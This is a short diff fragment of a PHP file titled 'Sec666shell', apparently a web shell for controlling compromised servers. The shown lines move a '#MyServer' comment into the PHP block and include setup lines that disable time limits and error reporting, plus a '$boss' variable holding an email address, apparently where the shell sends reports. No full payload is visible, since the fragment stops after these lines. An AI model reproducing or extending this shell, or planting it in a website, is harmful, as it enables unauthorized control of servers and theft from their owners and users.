@@ -17,8 +17,9 @@ h1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px
 </head>
 <center><br><h1 style="font-family: Calligraffitti;"><font color="white">Sec666shell</font></h1></center><table width="700" border="0" cellpadding="3" cellspacing="1" align="center"><br>
 
-#MyServer
+
 <?php
+#MyServer
 set_time_limit(0);
 error_reporting(0);
 $boss = 'zsec@gmx.com';
